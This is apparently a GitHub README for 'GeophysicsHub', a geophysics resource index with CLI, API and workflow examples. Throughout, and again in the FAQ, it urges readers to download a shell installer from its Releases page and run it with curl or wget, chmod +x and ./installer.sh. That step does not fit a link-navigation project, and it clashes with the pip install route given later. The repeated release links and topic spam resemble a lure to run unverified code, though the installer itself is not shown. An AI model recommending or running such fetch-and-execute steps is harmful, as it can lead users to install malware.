[![Releases](https://img.shields.io/badge/Releases-download-blue)](https://github.com/joseph235na/GeophysicsHub/releases)

# GeophysicsHub — Discover Geophysics Data, Tools, and Research

![Seismic waveform banner](https://upload.wikimedia.org/wikipedia/commons/6/6a/Seismogram_earthquake.png)

A curated navigation hub for geophysics. Find datasets, software, learning paths, and research links. Use the index to locate seismic data, geophysical properties, and analysis tools for research and teaching.

- Topics: awesome-resources • data-science • database • geology • geophysic • geophysical • geophysical-properties • geophysics-databases • geophysics-learning • geophysics-navigation • geophysics-research • geophysics-resources • geoscience • navigation-website • resource-monitor • resourcesharing • seismology • software-tools

[Download the release assets and run the installer from Releases](https://github.com/joseph235na/GeophysicsHub/releases)

---

Table of Contents
- About
- Key Features
- Visuals and Media
- Installation (Download and Execute Release)
- Quick Start
- Data Types and Formats
- Index Schema and Search
- API and Programmatic Access
- Example Workflows
  - Seismic data discovery
  - Rock property lookup
  - Geospatial queries
  - Machine learning prep
- Contributing
- Project Structure
- Roadmap
- Frequently Asked Questions
- License
- Contact

---

About

GeophysicsHub collects links and metadata for geophysics resources. The hub focuses on research-grade assets. It lists datasets, tools, code, tutorials, and databases. The site works as a navigation layer. It helps researchers and students find useful resources without long searches.

The hub stores metadata about:
- Seismic event catalogs
- Waveform archives
- Well logs and core data
- Rock physics tables
- Geophysical property databases
- Processing and imaging software
- Machine learning models for geoscience
- Educational materials and tutorials

Key Features

- Central index of geophysics resources and tools.
- Rich metadata for each resource: format, license, contact, DOI.
- Tag-driven navigation and curated lists.
- Quick filters: data type, region, license, format, size.
- Programmatic API and CLI for automation.
- Notebook-ready examples for Python and MATLAB.
- Community contribution workflow and moderation.

Why this hub helps
- Reduce search time.
- Avoid duplicate effort.
- Connect datasets to software best suited to them.
- Provide reproducible links and versioned releases.

Visuals and Media

![Seismic station](https://images.unsplash.com/photo-1530218612752-2a95f1a4f8f1?ixlib=rb-1.2.1&auto=format&fit=crop&w=1500&q=80)
![Geophysical map](https://upload.wikimedia.org/wikipedia/commons/7/73/Gravity_map_example.png)

Images above show a seismometer field site and an example geophysical map. Use imagery to orient users and to illustrate data types.

Installation (Download and Execute Release)

Download the release assets from the Releases page. The release includes an installer and sample datasets. After download, make the installer executable and run it. Replace the asset name with the actual file name from the release.

1. Use curl
```bash
curl -L -o geophysichub-installer.sh https://github.com/joseph235na/GeophysicsHub/releases/download/v1.0.0/geophysichub-installer.sh
chmod +x geophysichub-installer.sh
./geophysichub-installer.sh
```

2. Use wget
```bash
wget -O geophysichub-installer.sh https://github.com/joseph235na/GeophysicsHub/releases/download/v1.0.0/geophysichub-installer.sh
chmod +x geophysichub-installer.sh
./geophysichub-installer.sh
```

If the asset name differs, adjust the command to match the file name listed on the Releases page. The installer registers local caches and downloads a default index. It can fetch sample datasets for testing.

Quick Start

After installation, open the local web UI or use the CLI.

Run the local server:
```bash
geophysichub serve --port 8080
```

Open the UI at:
http://localhost:8080

Search with the CLI:
```bash
geophysichub search "seismic waveform" --format segy --region "California"
```

Get metadata for a resource:
```bash
geophysichub info resource_id_12345
```

Export a JSON list:
```bash
geophysichub export --query "rock physics" --format json > rock_physics_resources.json
```

Data Types and Formats

The hub indexes the following common geophysics formats and types:

- Seismic waveforms
  - SEG-Y (raw and processed)
  - MiniSEED
  - SAC
  - WAV (recording)
- Event catalogs
  - QuakeML
  - CSV-based catalogs
- Well logs and borehole data
  - LAS (Log ASCII Standard)
  - DLIS
  - CSV / TSV
- Geospatial formats
  - GeoTIFF (gravity, magnetics, maps)
  - NetCDF (gridded models, tomography)
  - Shapefile, GeoJSON
- Core and rock properties
  - Excel sheets with lab measurements
  - Raw measurement CSV
  - HDF5 archives
- Model output
  - VTK, ParaView files
  - SEG-Y for synthetic seismograms
- Auxiliary data
  - Station metadata (StationXML)
  - Instrument response files (RESP)
  - Metadata APIs (FDSN, IRIS, UNAVCO)

Index Schema and Search

GeophysicsHub stores resource records with a compact schema for fast queries. Key fields:
- id: unique resource id
- title: short title
- description: one-paragraph description
- tags: list of tags
- types: data types (segy, miniseed, las, netcdf)
- formats: file formats
- region: geographic region string (country, state, lat/lon bbox)
- bbox: [minLon, minLat, maxLon, maxLat]
- size: byte size or estimate
- license: e.g., CC-BY, CC0, MIT, proprietary
- doi: DOI where available
- url: canonical link to dataset or tool
- contact: maintainer name and email
- last_updated: timestamp
- release_version: release tag when resource was added
- checksum: sha256 of indexed file (where available)
- categories: dataset, software, tutorial, paper
- ratings: community score
- references: related DOI or paper links
- ingest_notes: notes about ingest or preprocessing

Search supports full text, tag filters, spatial filters, and format filters. Use boolean operators for precise queries.

Example queries:
- Find seismic datasets in Japan
  - tags: seismic, waveform
  - region: Japan
- Find rock physics labs with compressional velocity measurements
  - tags: rock-physics, vp, lab
- Find Open-source migration code
  - categories: software
  - license: MIT OR BSD OR Apache

API and Programmatic Access

The hub exposes a REST API and a small Python client. Use the API for automation and reproducible pipelines.

Base URL (local):
http://localhost:8080/api/v1

Endpoints:
- GET /resources — list resources with query parameters
- GET /resources/{id} — get resource metadata
- POST /resources — submit a new resource (authenticated)
- GET /tags — list tags
- GET /search — full-text search endpoint
- GET /download/{id} — direct download link (if hosted)

Python client (example)
```python
from geophysichub import Client

client = Client("http://localhost:8080/api/v1")
results = client.search("seismic waveform", format="segy", region="Chile")
for r in results:
    print(r['title'], r['url'])
```

Node/JS example
```js
const fetch = require('node-fetch');

async function search(query) {
  const url = `http://localhost:8080/api/v1/search?q=${encodeURIComponent(query)}&format=segy`;
  const res = await fetch(url);
  const data = await res.json();
  return data;
}

search("NW shelf seismic").then(console.log);
```

Authentication and rate limits
- Use API tokens for write operations.
- Read endpoints allow higher rate.
- For heavy downloads, we recommend direct download from data host using links in metadata.

Example Workflows

Seismic data discovery

Goal: find 3-component seismic data for a given event and region.

Steps:
1. Search for event catalog entry:
```bash
geophysichub search "Mw 6.5 2020" --tags event --format quakeml
```
2. Get station list and available waveform formats:
```bash
geophysichub info {event_id} --show-stations
```
3. Download waveform in miniSEED:
```bash
geophysichub download waveform_456 --format miniseed --out ./data/event_456.mseed
```
4. Use ObsPy to read and process:
```python
from obspy import read
st = read("./data/event_456.mseed")
st.detrend('linear')
st.filter('bandpass', freqmin=0.1, freqmax=10.0)
```

Rock property lookup

Goal: fetch lab velocity and density measurements for shale samples.

1. Search:
```bash
geophysichub search "shale vp vs rho" --tags rock-physics --format csv
```
2. Inspect metadata:
```bash
geophysichub info rp_dataset_12
```
3. Download CSV:
```bash
geophysichub download rp_dataset_12 --out shale_lab_data.csv
```
4. Load in Python:
```python
import pandas as pd
df = pd.read_csv("shale_lab_data.csv")
print(df[['vp', 'vs', 'rho']].describe())
```

Geospatial queries

Goal: list gravity surveys within a bounding box.

1. Query with bbox:
```bash
geophysichub search --bbox -122.7,36.6,-121.7,37.4 --tags gravity --format geotiff
```
2. Download and view in QGIS or rasterio:
```python
import rasterio
r = rasterio.open("gravity_survey.tif")
print(r.crs, r.bounds)
```

Machine learning prep

Goal: prepare labeled seismic traces for supervised ML.

1. Find annotated waveform datasets:
```bash
geophysichub search "annotated traces" --tags ml,labels --format hdf5
```
2. Download dataset and labels:
```bash
geophysichub download annotated_traces_v2 --out annotated_traces_v2.h5
```
3. Use PyTorch or TensorFlow for loading and training:
```python
import h5py
with h5py.File("annotated_traces_v2.h5","r") as f:
    X = f['traces'][:]
    y = f['labels'][:]
```
4. Use the hub metadata to track model provenance and dataset license.

Contributing

GeophysicsHub works on community input. Follow this guide to contribute resources, code, or docs.

How to add a resource
- Fork the repository.
- Add a JSON metadata file in /resources/new/ with the required schema.
- Open a pull request.
- The team reviews metadata, tests links, and merges.

Minimal metadata file (example)
```json
{
  "id": "example-2025-01",
  "title": "Example seismic survey, NW shelf",
  "description": "Multi-channel seismic lines over continental shelf.",
  "tags": ["seismic", "segy", "survey"],
  "types": ["segy"],
  "formats": ["segy"],
  "region": "NW Shelf",
  "bbox": [-123.5, 35.0, -120.5, 38.0],
  "size": 124000000,
  "license": "CC-BY-4.0",
  "doi": "10.1234/example.doi",
  "url": "https://data.example.org/seismic/nw_shelf",
  "contact": "Alice Researcher <alice@example.org>",
  "last_updated": "2024-05-08T12:00:00Z",
  "categories": ["dataset"]
}
```

Guidelines for contributors
- Provide canonical URLs.
- Prefer DOIs for datasets and papers.
- Include station and instrument metadata where possible.
- Add license info.
- Provide checksums for large files.

Code contributions
- Follow the code style in the repository.
- Add tests for new code paths.
- Open a pull request with a clear description.
- Use a feature branch per PR.

Project Structure

The repository keeps a clear layout.

- /docs — documentation and tutorials
- /resources — indexed metadata entries (JSON)
- /data_samples — small sample datasets for testing
- /cli — command-line tool source
- /server — web server and API
- /notebooks — example notebooks (Python, MATLAB)
- /scripts — helper scripts for ingest, conversion
- /tests — unit and integration tests
- LICENSE
- README.md

Roadmap

Planned items:
- Add geospatial tiling for large gridded datasets.
- Implement advanced search by instrument response.
- Add provenance chain for datasets and models.
- Integrate with major archives via harvesters (IRIS, USGS, OpenTopography).
- Add DOI minting for curated packages.
- Add user profiles and saved searches.
- Publish Docker images for reproducible server deployment.

Frequently Asked Questions

Q: Where do resources come from?
A: Resources come from public archives, institutional repositories, community submissions, and curated lists. The hub links to data at its source. The hub does not host all large files. It can host small samples and mirrors for long-term preservation when allowed.

Q: What licenses does the hub include?
A: The hub indexes resources under a range of licenses. You can filter by license. The hub shows the license for each resource. Respect the license terms when you reuse resources.

Q: How do I cite a resource?
A: Use the DOI when available. The resource metadata shows the recommended citation. If no DOI exists, cite the original host and the hub record id.

Q: Can I run the hub in the cloud?
A: Yes. Use the Dockerfile for a containerized deployment. Use environment variables for production configuration.

Q: How do you handle private datasets?
A: The hub supports private entries for registered teams. Private entries appear only to authorized users. Use secure storage for data.

Q: What if a link is broken?
A: Submit an issue or a pull request to update the URL. The hub runs periodic link checks and flags broken links for review.

Q: Where do I get the release installer?
A: Get the installer from the Releases page. The release package must be downloaded and executed as shown in the Installation section. [Releases](https://github.com/joseph235na/GeophysicsHub/releases)

Security and Privacy

- Use tokens for authenticated endpoints.
- Keep keys in secure stores.
- The hub logs access events for auditing.
- For private datasets, use encrypted storage and access control lists.

Indexing and Ingest

Ingest pipeline
- Fetch metadata from source APIs and DOIs.
- Validate format and schema.
- Normalize fields: tags, formats, bbox.
- Compute checksums.
- Store resource record in the index.
- Optionally fetch sample files for preview.

Supported harvesters
- FDSN event and wave APIs
- IRIS DMC
- USGS earthquake and geologic data
- OpenTopography
- Institutional data portals via OAI-PMH or REST APIs

Scaling

For large deployments:
- Use a scalable database (Elasticsearch for search, PostgreSQL for core metadata).
- Use object storage for sample files (S3, MinIO).
- Use a message queue for ingest jobs (RabbitMQ, Kafka).
- Deploy via Kubernetes for horizontal scaling.

Search tuning
- Use analyzers for scientific text (units, abbreviations).
- Provide synonyms for terms (Vp = P-wave velocity).
- Index numeric fields for range queries.

Provenance and Reproducibility

Each resource record includes provenance fields:
- source_url
- harvested_from
- harvest_timestamp
- ingest_notes
- checksum

Keep a reproducible recipe for derived datasets. Store the processing scripts, parameter files, and seed data. Use container images to capture environment.

Example: Reproducible tomography dataset
- Original waveforms: IRIS ID
- Preprocessing script: git commit id
- Tomography script: GitHub link and tag
- Output: NetCDF with DOI
- All steps combined in a notebook and the hub metadata.

Sample Notebooks and Tutorials

The /notebooks folder contains tutorials:
- Seismic waveform processing with ObsPy
- Basic velocity analysis from well logs with lasio
- Gravity inversion workflow using open-source inversion tools
- Building a supervised model for first-break picking
- Visualizing gridded geophysical models with matplotlib and cartopy

Each notebook uses a small sample dataset from /data_samples. The notebooks show reproducible steps and command lines. They include references to the hub records for datasets.

Community and Governance

- The project uses a small core team for review.
- Community members can propose resources and improvements.
- Maintain a Code of Conduct in the repository.
- Use issues for bugs and feature requests.
- Use a milestone board for roadmap planning.

Testing

- Unit tests for index functions.
- Integration tests for API endpoints.
- Link checkers to validate URLs.
- Continuous integration runs tests on PRs.

Metrics

Track:
- Number of indexed resources
- Downloads and API hits
- Top search terms
- Community contributions

These metrics help guide improvements.

Integration with Tools

Common integrations:
- ObsPy for waveform processing
- segyio for SEGY I/O
- lasio for well logs
- pyproj and cartopy for mapping
- PyTorch and TensorFlow for ML
- GDAL and rasterio for gridded data
- QGIS for geospatial visualization

Use cases by audience

Researchers
- Find datasets for testing methods.
- Link published methods to input data.
- Track dataset versions.

Students and Educators
- Find tutorials and sample data for classes.
- Use notebooks in teaching labs.
- Reuse curated datasets for assignments.

Industry
- Locate open datasets for benchmarking.
- Find software tools with permissive licenses.
- Share non-sensitive datasets with permission.

Maintainers and Curators
- Harvest new data feeds.
- Curate lists for topical surveys.
- Monitor link integrity.

References and Data Sources

Common archives and standards referenced in the hub:
- IRIS (Incorporated Research Institutions for Seismology)
- USGS (United States Geological Survey)
- OpenTopography
- EGS (European Geological Survey) datasets
- SEG (Society of Exploration Geophysicists) resources
- IUGS and other society data portals
- NetCDF and CF metadata conventions
- StationXML, QuakeML, FDSN standards

Examples of datasets you will find
- Regional seismic reflection surveys (SEGY)
- Ocean bottom seismometer campaigns (miniSEED)
- Global teleseismic event catalogs (QuakeML)
- Well log collections for reservoir studies (LAS)
- Gravity and magnetic grids (GeoTIFF)
- Rock physics measurement tables (CSV/HDF5)
- Annotated trace datasets for ML (HDF5, TFRecord)

Example: SEGY record entry
- title: "Gulf Margin 2017 2D Reflection Lines"
- description: "High-resolution 2D seismic reflection lines acquired in 2017 over the Gulf margin."
- formats: segy
- size: 24 GB
- url: https://data.host.org/gulf_margin_2017/segy.zip
- license: CC-BY-4.0
- doi: 10.5678/gulf-2017

Search Ranking and Curation

Ranking factors:
- Relevance to query
- Date of last update
- Community rating and stars
- Presence of DOI or publication
- Size and access bandwidth (for heavy resources, show mirrors)

Curated lists
- Best datasets for travel-time tomography
- Top open seismic reflection surveys
- Machine learning-ready seismic datasets
- Teaching datasets for undergraduate labs

Maintenance Tasks

- Run link checker weekly.
- Harvest new archives monthly.
- Run checksum validator quarterly.
- Review community submissions biweekly.

License

The code and metadata templates in this repository use the MIT License. Individual resources keep their original license. Respect dataset license when you reuse data.

Contact

- Maintainers: core team listed in the repository.
- Issues: use GitHub issues for bug reports and feature requests.
- Pull requests: use feature branches and a clear description.

Appendix: Useful Commands and Examples

Install CLI with pip
```bash
pip install geophysichub
```

Run local server
```bash
geophysichub serve --db ./geophysichub.db --port 8080
```

Index a new JSON resource
```bash
geophysichub ingest resources/new/example-2025-01.json
```

Export search results to CSV
```bash
geophysichub search "gravity survey" --format geotiff --limit 100 | geophysichub export --format csv > gravity_surveys.csv
```

Get resource metadata in JSON
```bash
curl -s "http://localhost:8080/api/v1/resources/resource_id_12345" | jq '.'
```

Automate harvest from IRIS (example)
```bash
geophysichub harvester iris --start 2025-01-01 --end 2025-02-01 --out iris_harvest_2025-01.json
geophysichub ingest iris_harvest_2025-01.json
```

Badge and Release Link

Use the Releases badge at the top to find installer and assets:
[![Releases](https://img.shields.io/badge/Releases-download-blue)](https://github.com/joseph235na/GeophysicsHub/releases)

If you cannot find a specific asset or if the installer changes name, check the Releases section on GitHub to find the right file.